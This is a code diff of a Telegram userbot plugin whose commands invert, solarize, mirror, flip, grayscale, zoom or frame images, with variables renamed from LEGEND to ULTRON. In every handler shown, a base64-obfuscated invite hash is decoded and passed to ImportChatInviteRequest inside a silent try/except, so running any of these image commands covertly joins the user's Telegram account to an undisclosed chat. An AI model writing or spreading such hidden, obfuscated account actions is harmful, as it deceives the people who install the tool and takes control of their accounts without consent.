@@ -46,609 +46,609 @@ async def crop(imagefile, endname, x):
 
 @ULTRONBOT.on(admin_cmd(pattern="invert$", outgoing=True))
 @ULTRONBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if legend else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await ULTRON.client.send_file(
+        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
     )
-    await LEGEND.delete()
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
 @ULTRONBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if legend else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await ULTRON.client.send_file(
+        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
     )
-    await LEGEND.delete()
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
 @ULTRONBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await ULTRON.client.send_file(
+        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
     )
-    await LEGEND.delete()
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
 @ULTRONBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if legend else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await ULTRON.client.send_file(
+        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
     )
-    await LEGEND.delete()
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
 @ULTRONBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await ULTRON.client.send_file(
+        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
     )
-    await LEGEND.delete()
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
 @ULTRONBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONinput = ULTRON.pattern_match.group(1)
+    ULTRONinput = 50 if not ULTRONinput else int(ULTRONinput)
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, LEGENDinput)
+        await crop(meme_file, outputfile, ULTRONinput)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await ULTRON.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await ULTRON.client.send_file(
+            ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await ULTRON.edit(f"`{e}`")
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @ULTRONBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
 @ULTRONBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(ULTRON):
+    if ULTRON.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await ULTRON.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    if not LEGENDinput:
-        LEGENDinput = 50
-    if ";" in str(LEGENDinput):
-        LEGENDinput, colr = LEGENDinput.split(";", 1)
+    ULTRONinput = ULTRON.pattern_match.group(1)
+    if not ULTRONinput:
+        ULTRONinput = 50
+    if ";" in str(ULTRONinput):
+        ULTRONinput, colr = ULTRONinput.split(";", 1)
     else:
         colr = 0
-    LEGENDinput = int(LEGENDinput)
+    ULTRONinput = int(ULTRONinput)
     colr = int(colr)
